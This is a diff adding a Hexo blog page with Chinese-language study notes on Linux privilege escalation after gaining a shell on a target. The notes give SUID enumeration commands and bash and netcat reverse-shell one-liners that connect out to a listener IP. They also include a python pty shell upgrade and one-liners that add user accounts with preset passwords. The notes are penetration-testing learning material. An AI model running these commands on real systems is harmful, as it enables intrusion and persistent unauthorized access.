@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="鸡翅儿">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux-提权">
+<meta property="og:url" content="http://wcute.github.io/2018/12/09/Linux-提权/index.html">
+<meta property="og:site_name" content="鸡翅儿">
+<meta property="og:description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-10T13:32:29.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux-提权">
+<meta name="twitter:description" content="参考链接：https://www.tuicool.com/articles/NzMJRjmhttps://www.anquanke.com/post/id/87017 在获取靶机shell之后，首先看一下是什么权限，权限低的话就要进行提权了  常规思路：  检查漏洞系统的操作系统发行版 cat /etc/issuecat /etc/*-release   查看内核版本(获取版本后可使用kali自带">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wcute.github.io/2018/12/09/Linux-提权/">
+
+
+
+
+
+  <title>Linux-提权 | 鸡翅儿</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">鸡翅儿</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Linux-提权/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux-提权</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>参考链接：<br><a href="https://www.tuicool.com/articles/NzMJRjm" target="_blank" rel="noopener">https://www.tuicool.com/articles/NzMJRjm</a><br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
+<p>在获取靶机<code>shell</code>之后，首先看一下是什么权限，权限低的话就要进行提权了</p>
+<p> 常规思路：</p>
+<ol>
+<li>检查漏洞系统的操作系统发行版<blockquote>
+<p>cat /etc/issue<br>cat /etc/*-release</p>
+</blockquote>
+</li>
+<li>查看内核版本(获取版本后可使用<code>kali</code>自带的<code>searcsploit</code>搜寻漏洞利用代码)<blockquote>
+<p>uname -a</p>
+</blockquote>
+</li>
+<li><p>检查可用的用户及当前用户的权限</p>
+<blockquote>
+<p>whoami</p>
+</blockquote>
+</li>
+<li><p>列出SUID文件（SUID目的是让本来没有相应权限的用户运行这个程序时可以访问没有权限访问的资源）</p>
+<blockquote>
+<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \;<br>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
+</blockquote>
+</li>
+</ol>
+<p>已知可以用来提权的linux可执行文件：<code>nmap</code> <code>vim</code> <code>find</code> <code>Bash</code> <code>More</code> <code>Less</code> <code>Nano</code> <code>cp</code></p>
+<ol start="5">
+<li>查看安装的包、程序、运行的服务。过时的版本可能存在漏洞。</li>
+</ol>
+<h4 id="Bash-反弹-shell"><a href="#Bash-反弹-shell" class="headerlink" title="Bash 反弹 shell"></a>Bash 反弹 shell</h4><p>bash 一句话反弹</p>
+<blockquote>
+<p>本地 nc -l -p 8080<br> 靶机 bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
+</blockquote>
+<pre><code>    命令                      命令详解
+bash -i               产生一个bash交互环境
+&gt;&amp;                    将联合符号前面的内容与后面相结合然后一起重定向给后者
+/dev/tcp/ip/端口      linux 环境中所有的内容都是以文件的形式存在的，让主机与目标主机ip:端口建立一个TCP连接 
+0&gt;&amp;1                  将 标准的输入 与 标准输出 内容相结合，然后重定向给前面  标准的输出 内容
+</code></pre><p>详细解读过程：<code>bash</code>产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<h4 id="Netcat-工具反弹"><a href="#Netcat-工具反弹" class="headerlink" title="Netcat 工具反弹"></a>Netcat 工具反弹</h4><ol>
+<li>开启外网主机监听<blockquote>
+<p>root@kali:~#nc -lvpp 4050</p>
+</blockquote>
+</li>
+<li>netcat 反弹一句话<blockquote>
+<p>靶机$：nc ip 端口 -t -e /bin/bash</p>
+</blockquote>
+</li>
+</ol>
+<p>通过靶机webshell使用nc命令建立一个<code>ip:端口</code>的会话连接，将本地shell通过这个会话反弹给目标主机</p>
+<h4 id="python-标准虚拟终端获取"><a href="#python-标准虚拟终端获取" class="headerlink" title="python 标准虚拟终端获取"></a>python 标准虚拟终端获取</h4><p>python一句话获取标准<code>shell</code></p>
+<blockquote>
+<p> python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
+</blockquote>
+<pre><code> 命令                                命令详解
+ -c                       命令行执行 
+import pty                引入标准库pty           
+pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标准的shell
+</code></pre><h4 id="Linux-一句话添加账户"><a href="#Linux-一句话添加账户" class="headerlink" title="Linux 一句话添加账户"></a>Linux 一句话添加账户</h4><ol>
+<li>chpasswd 方法<blockquote>
+<p>useradd test;echo ‘test:123456’|chpasswd</p>
+</blockquote>
+</li>
+<li>useradd -p 方法<blockquote>
+<p>useradd -p `openssl passwd 123456` guest</p>
+</blockquote>
+</li>
+<li>echo -e 方法<blockquote>
+<p>useradd test;echo -e “123456n123456n” |passwd test</p>
+</blockquote>
+</li>
+</ol>
+<p><br><hr>其他的感觉不是经常使用，就没有再做笔记了</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/09/JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现/" rel="next" title="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现">
+                <i class="fa fa-chevron-left"></i> JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/09/CSRF漏洞学习/" rel="prev" title="CSRF漏洞学习">
+                CSRF漏洞学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">wcute</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bash-反弹-shell"><span class="nav-number">1.</span> <span class="nav-text">Bash 反弹 shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat-工具反弹"><span class="nav-number">2.</span> <span class="nav-text">Netcat 工具反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-标准虚拟终端获取"><span class="nav-number">3.</span> <span class="nav-text">python 标准虚拟终端获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-一句话添加账户"><span class="nav-number">4.</span> <span class="nav-text">Linux 一句话添加账户</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wcute</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
